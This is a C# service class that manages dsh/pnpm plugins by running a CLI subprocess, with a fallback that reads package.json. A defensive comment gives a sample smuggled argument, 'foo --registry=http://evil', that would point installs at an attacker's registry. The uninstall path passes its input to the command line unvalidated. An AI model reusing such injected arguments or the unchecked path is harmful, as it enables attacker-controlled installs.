using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace DshManager.Services;

/// <summary>
/// 插件条目模型：描述一个已安装插件的名称、版本与激活状态。
/// 由 <see cref="DshPluginService"/> 的列表方法填充。
/// </summary>
public class PluginItem
{
    /// <summary>插件包名（如 dsh-better-sidebar、@deepseek-ai/xxx）。</summary>
    public string Name { get; set; } = string.Empty;

    /// <summary>插件版本号（解析失败时为安装规格或 unknown）。</summary>
    public string Version { get; set; } = string.Empty;

    /// <summary>激活状态："已激活"（作为 dsh.profile.bundles 层加载）或 "未激活"（普通依赖）。</summary>
    public string Status { get; set; } = string.Empty;
}

/// <summary>
/// dsh 插件管理服务：包装 `dsh plugin --profile &lt;name&gt; &lt;pnpm args&gt;` 子命令。
/// 该子命令本质是 pnpm 的薄转发层（源码 lib/plugin-*.js），因此：
/// - 列出：`dsh plugin --profile &lt;name&gt; list --depth 0`（pnpm list 文本输出）；
/// - 安装：`dsh plugin --profile &lt;name&gt; add &lt;spec&gt;`（可一次多个包，空格分隔）；
/// - 卸载：`dsh plugin --profile &lt;name&gt; remove &lt;name&gt;`。
/// 子进程运行并逐行触发 <see cref="OutputReceived"/>，命令带超时（默认 3 分钟）与取消支持。
/// 若 CLI 不可用（启动器缺失 / 启动失败 / 超时 / 非零退出），列表操作优雅降级：
/// 直接读取 profile 的 package.json（dependencies + dsh.profile.bundles），
/// 其余操作返回失败并把原因写入输出事件，绝不抛异常。
/// </summary>
public class DshPluginService
{
    /// <summary>输出行事件：子进程输出或降级说明逐行触发（在子进程线程触发，UI 订阅方需自行调度到 UI 线程）。</summary>
    public event EventHandler<string>? OutputReceived;

    /// <summary>匹配 pnpm list 输出中的条目行，形如 `├── dsh-better-sidebar@0.19.1`（作用域包名如 @deepseek-ai/xxx 也兼容）。</summary>
    private static readonly Regex PnpmEntryRegex =
        new(@"^(?:├── |└── )(.+)@([^@\s]+)$", RegexOptions.Compiled);

    private readonly string _launchCommand;
    private readonly string _profileName;
    private readonly TimeSpan _timeout;

    /// <summary>
    /// 创建插件管理服务。
    /// </summary>
    /// <param name="launcherPath">dsh 启动命令（可为完整命令串，如 "C:\Program Files\nodejs\npx.cmd" --yes @deepseek-ai/dsh@x.y.z 或启动器路径）；
    /// 为空时由全局发现服务扫描（AppServices.Discovery.Scan().LaunchCommand）。</param>
    /// <param name="profileName">目标 profile 名（对应 ~/.dsh/profiles/&lt;name&gt;），默认 "web"。</param>
    /// <param name="timeout">单次命令超时；为空时默认 3 分钟。</param>
    public DshPluginService(string? launcherPath = null, string profileName = "web", TimeSpan? timeout = null)
    {
        var command = string.IsNullOrWhiteSpace(launcherPath) ? SafeScanCommand() : launcherPath;
        // 无扩展名的 sh shim（如 bin/dsh）在 Windows 上无法直接启动 → 就对可执行文件部分就近找同名 .cmd/.bat/.exe/.ps1
        _launchCommand = NormalizeCommand(command);
        _profileName = profileName;
        _timeout = timeout ?? TimeSpan.FromMinutes(3);
    }

    /// <summary>当前操作的 profile 名（UI 展示用）。</summary>
    public string ProfileName => _profileName;

    /// <summary>profile 目录：%USERPROFILE%\.dsh\profiles\&lt;name&gt;（列表降级读取清单用）。</summary>
    public string ProfileDirectory =>
        Path.Combine(DshDiscoveryService.GetDefaultDshHome(), "profiles", _profileName);

    /// <summary>
    /// 列出已安装插件：优先运行 CLI（pnpm list 文本），失败时降级读取 profile 的 package.json。
    /// 两种路径都不会抛异常。
    /// </summary>
    public async Task<IReadOnlyList<PluginItem>> ListAsync(CancellationToken cancellationToken = default)
    {
        var (cliOk, cliOutput) = await RunCliAsync("list --depth 0", cancellationToken).ConfigureAwait(false);
        if (cliOk)
        {
            var items = ParsePnpmList(cliOutput);
            EmitLine($"✅ 已从 dsh 命令行读取 {items.Count} 个插件");
            return items;
        }

        // CLI 不可用：优雅降级到 profile 清单（dependencies + bundles）
        if (!string.IsNullOrWhiteSpace(cliOutput))
        {
            EmitLine("⚠️ dsh 插件命令执行失败，已改读 profile 的 package.json 清单：");
            EmitLine(cliOutput);
        }
        else
        {
            EmitLine($"⚠️ dsh 启动命令不可用（{_launchCommand}），已改读 profile 的 package.json 清单");
        }
        return ReadManifestPlugins();
    }

    /// <summary>安装插件：`dsh plugin --profile &lt;name&gt; add &lt;spec&gt;`；成功（退出码 0）返回 true。</summary>
    /// <remarks>
    /// 支持一次安装多个包（空格分隔）。每条规格都要过 <see cref="PackageSpecValidator"/>：
    /// 输入框的内容会直接拼进 node 的 argv，空格后的 token 会被 pnpm 当成独立选项解析，
    /// 形如 <c>foo --registry=http://evil</c> 的输入能改写安装源并执行攻击者的安装脚本。
    /// 任一条不合法就整体拒绝 —— 部分安装比不安装更糟（用户以为装全了，实际只装了一半）。
    /// </remarks>
    public async Task<bool> InstallAsync(string packageSpec, CancellationToken cancellationToken = default)
    {
        if (!PackageSpecValidator.TryValidateSpecList(packageSpec, out var specs, out var invalidToken))
        {
            var bad = invalidToken.Length == 0 ? (packageSpec ?? string.Empty).Trim() : invalidToken;
            EmitLine($"❌ 安装规格不合法，已拒绝执行：{bad}");
            EmitLine("  包名只能包含字母、数字与 . _ - ~ /（作用域包形如 @scope/name）；" +
                     "版本用 @ 或 # 分隔，只能包含字母、数字与 . - + _ ~ ^ * >。");
            EmitLine("  多包安装用空格分隔。");
            return false;
        }

        var spec = string.Join(" ", specs);
        var (ok, output) = await RunCliAsync($"add {spec}", cancellationToken).ConfigureAwait(false);
        if (!ok)
        {
            EmitLine($"❌ 安装失败（退出码非 0）：{spec}");
            if (!string.IsNullOrWhiteSpace(output)) EmitLine(output);
        }
        return ok;
    }

    /// <summary>卸载插件：`dsh plugin --profile &lt;name&gt; remove &lt;name&gt;`；成功（退出码 0）返回 true。</summary>
    public async Task<bool> UninstallAsync(string name, CancellationToken cancellationToken = default)
    {
        var pluginName = name?.Trim() ?? string.Empty;
        if (pluginName.Length == 0) return false;

        var (ok, output) = await RunCliAsync($"remove {pluginName}", cancellationToken).ConfigureAwait(false);
        if (!ok)
        {
            EmitLine($"❌ 卸载失败（退出码非 0）：{pluginName}");
            if (!string.IsNullOrWhiteSpace(output)) EmitLine(output);
        }
        return ok;
    }

    /// <summary>
    /// 在子进程运行一条 dsh plugin 命令：实时捕获输出、支持超时与取消。
    /// 返回 (是否成功, 累计输出)；启动失败 / 超时 / 取消一律视为失败，不抛异常。
    /// </summary>
    private async Task<(bool Ok, string Output)> RunCliAsync(string args, CancellationToken cancellationToken)
    {
        // 拆分启动命令：FileName 为可执行文件，前缀参数（如 --yes @deepseek-ai/dsh@x.y.z）需保留在子命令之前
        DshProcessService.SplitCommand(_launchCommand, out var fileName, out var prefixArgs);
        if (string.IsNullOrWhiteSpace(fileName))
            return (false, string.Empty);

        var arguments = string.IsNullOrWhiteSpace(prefixArgs)
            ? $"plugin --profile {_profileName} {args}"
            : $"{prefixArgs} plugin --profile {_profileName} {args}";

        var output = new StringBuilder();
        using var process = new Process();
        process.StartInfo = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
            // 统一按 UTF-8 解码输出，避免中文乱码（dsh.cmd 内部是 Node/pnpm）
            StandardOutputEncoding = Encoding.UTF8,
            StandardErrorEncoding = Encoding.UTF8,
        };

        // 逐行捕获 stdout / stderr：既累计到 output，也实时触发 OutputReceived 供 UI 展示
        process.OutputDataReceived += (_, e) => AppendLine(output, e.Data);
        process.ErrorDataReceived += (_, e) => AppendLine(output, e.Data);

        try
        {
            if (!process.Start())
                return (false, output.ToString());

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            // 叠加超时与调用方取消信号：任一先到即停止等待
            using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            timeoutCts.CancelAfter(_timeout);

            var exited = true;
            try
            {
                // WaitForExitAsync 在进程退出后会自动排空异步输出事件，确保 output 完整
                await process.WaitForExitAsync(timeoutCts.Token).ConfigureAwait(false);
            }
            catch (OperationCanceledException)
            {
                exited = false; // 超时或调用方取消：走强制结束分支
            }

            if (!exited)
            {
                try { process.Kill(entireProcessTree: true); } catch { /* 已退出则忽略 */ }
                await process.WaitForExitAsync(CancellationToken.None).ConfigureAwait(false);
                EmitLine(cancellationToken.IsCancellationRequested
                    ? "⚠️ 插件命令已被取消"
                    : "⚠️ 插件命令执行超时（超过 3 分钟）");
                return (false, output.ToString());
            }

            return (process.ExitCode == 0, output.ToString());
        }
        catch (Exception ex)
        {
            // 启动失败（如启动器不可执行 / 不在 Windows 环境）：不崩溃，走降级路径
            EmitLine($"⚠️ 启动 dsh 插件命令失败：{ex.Message}");
            return (false, output.ToString());
        }
    }

    /// <summary>解析 pnpm list 文本输出为插件条目；状态按 profile 的 bundles 集合标记激活与否。</summary>
    private IReadOnlyList<PluginItem> ParsePnpmList(string output)
    {
        var bundles = ReadBundles();
        var items = new List<PluginItem>();
        foreach (var rawLine in output.Split('\n'))
        {
            var line = rawLine.TrimEnd('\r');
            var match = PnpmEntryRegex.Match(line);
            if (!match.Success) continue;

            var name = match.Groups[1].Value.Trim();
            items.Add(new PluginItem
            {
                Name = name,
                Version = match.Groups[2].Value.Trim(),
                Status = bundles.Contains(name) ? "已激活" : "未激活",
            });
        }
        return items;
    }

    /// <summary>
    /// 降级读取 profile 清单：package.json 的 dependencies 即已安装插件；
    /// 版本优先取 node_modules 中真实包版本，读不到则用安装规格（去掉 ^~ 前缀）。
    /// </summary>
    private IReadOnlyList<PluginItem> ReadManifestPlugins()
    {
        var manifestPath = Path.Combine(ProfileDirectory, "package.json");
        if (!File.Exists(manifestPath))
        {
            EmitLine($"⚠️ 未找到 profile 清单：{manifestPath}");
            return Array.Empty<PluginItem>();
        }

        try
        {
            var bundles = ReadBundles();
            using var doc = JsonDocument.Parse(File.ReadAllText(manifestPath));
            var root = doc.RootElement;
            var items = new List<PluginItem>();

            if (root.TryGetProperty("dependencies", out var deps) && deps.ValueKind == JsonValueKind.Object)
            {
                foreach (var prop in deps.EnumerateObject())
                {
                    var spec = prop.Value.GetString() ?? string.Empty;
                    items.Add(new PluginItem
                    {
                        Name = prop.Name,
                        Version = ResolveInstalledVersion(ProfileDirectory, prop.Name) ?? NormalizeVersionSpec(spec),
                        Status = bundles.Contains(prop.Name) ? "已激活" : "未激活",
                    });
                }
            }

            EmitLine($"⚠️ 已降级读取 {items.Count} 个插件（来源：{manifestPath}）");
            return items;
        }
        catch (Exception ex)
        {
            EmitLine($"⚠️ 读取 profile 清单失败：{ex.Message}");
            return Array.Empty<PluginItem>();
        }
    }

    /// <summary>读取 profile 清单中的 dsh.profile.bundles（激活层列表）为集合；解析失败返回空集。</summary>
    private HashSet<string> ReadBundles()
    {
        var manifestPath = Path.Combine(ProfileDirectory, "package.json");
        var result = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        if (!File.Exists(manifestPath)) return result;

        try
        {
            using var doc = JsonDocument.Parse(File.ReadAllText(manifestPath));
            var root = doc.RootElement;
            if (root.TryGetProperty("dsh", out var dsh)
                && dsh.TryGetProperty("profile", out var profile)
                && profile.TryGetProperty("bundles", out var bundles)
                && bundles.ValueKind == JsonValueKind.Array)
            {
                foreach (var element in bundles.EnumerateArray())
                {
                    if (element.ValueKind == JsonValueKind.String)
                        result.Add(element.GetString() ?? string.Empty);
                }
            }
        }
        catch
        {
            // 清单损坏时按"无激活层"处理，不影响列表展示
        }
        return result;
    }

    /// <summary>读取 &lt;profileDir&gt;/node_modules/&lt;name&gt;/package.json 的真实版本；读不到返回 null。</summary>
    private static string? ResolveInstalledVersion(string profileDir, string packageName)
    {
        try
        {
            // Path.Combine 对作用域包名（@scope/name）会正确拼成 node_modules/@scope/name
            var manifestPath = Path.Combine(profileDir, "node_modules", packageName, "package.json");
            if (!File.Exists(manifestPath)) return null;

            using var doc = JsonDocument.Parse(File.ReadAllText(manifestPath));
            return doc.RootElement.TryGetProperty("version", out var version)
                   && version.ValueKind == JsonValueKind.String
                ? version.GetString()
                : null;
        }
        catch
        {
            // 包目录缺失 / 清单损坏时返回 null，由调用方回退到安装规格
            return null;
        }
    }

    /// <summary>去掉版本规格的 ^ / ~ / = 前缀（仅展示用，不参与语义化计算）。</summary>
    private static string NormalizeVersionSpec(string spec)
    {
        var trimmed = spec.Trim();
        if (trimmed.Length == 0) return "unknown";
        if (trimmed[0] is '^' or '~' or '=' or 'v' or '>')
            trimmed = trimmed[1..].TrimStart(' ', '=');
        return trimmed.Length == 0 ? "unknown" : trimmed;
    }

    /// <summary>追加一行输出：累计到缓冲并实时转发 OutputReceived。</summary>
    private void AppendLine(StringBuilder output, string? line)
    {
        if (line == null) return;
        output.AppendLine(line);
        EmitLine(line);
    }

    private void EmitLine(string line) => OutputReceived?.Invoke(this, line);

    /// <summary>通过全局发现服务安全扫描启动命令；扫描失败返回空字符串。</summary>
    private static string SafeScanCommand()
    {
        try
        {
            return AppServices.Discovery.Scan().LaunchCommand;
        }
        catch
        {
            return string.Empty;
        }
    }

    /// <summary>
    /// 规范化启动命令：只对「可执行文件」部分做扩展名解析（无扩展名的 sh shim → 就近找 .cmd/.bat/.exe/.ps1），
    /// 参数前缀原样保留，避免把 npx 的 "--yes @deepseek-ai/dsh" 前缀破坏掉。
    /// </summary>
    private static string NormalizeCommand(string command)
    {
        if (string.IsNullOrWhiteSpace(command)) return command;

        DshProcessService.SplitCommand(command, out var fileName, out var args);
        var resolved = ResolveExecutable(fileName);
        if (string.Equals(resolved, fileName, StringComparison.Ordinal))
            return command;

        return string.IsNullOrWhiteSpace(args) ? resolved : $"{resolved} {args}";
    }

    /// <summary>
    /// 将启动器路径解析为可执行的 Windows 文件：
    /// 已有 .exe/.cmd/.bat/.ps1 扩展名则原样返回；
    /// 无扩展名（Unix sh shim，如 .ai-manager/bin/dsh）时，在同目录就近找 dsh.cmd/.bat/.exe/.ps1。
    /// </summary>
    private static string ResolveExecutable(string launcherPath)
    {
        if (string.IsNullOrWhiteSpace(launcherPath)) return launcherPath;

        var ext = Path.GetExtension(launcherPath);
        if (ext.Equals(".exe", StringComparison.OrdinalIgnoreCase)
            || ext.Equals(".cmd", StringComparison.OrdinalIgnoreCase)
            || ext.Equals(".bat", StringComparison.OrdinalIgnoreCase)
            || ext.Equals(".ps1", StringComparison.OrdinalIgnoreCase))
        {
            return launcherPath;
        }

        var dir = Path.GetDirectoryName(launcherPath);
        var baseName = Path.GetFileNameWithoutExtension(launcherPath);
        if (string.IsNullOrEmpty(dir) || string.IsNullOrEmpty(baseName)) return launcherPath;

        foreach (var candidateExt in new[] { ".cmd", ".bat", ".exe", ".ps1" })
        {
            var candidate = Path.Combine(dir, baseName + candidateExt);
            if (File.Exists(candidate)) return candidate;
        }
        return launcherPath;
    }
}
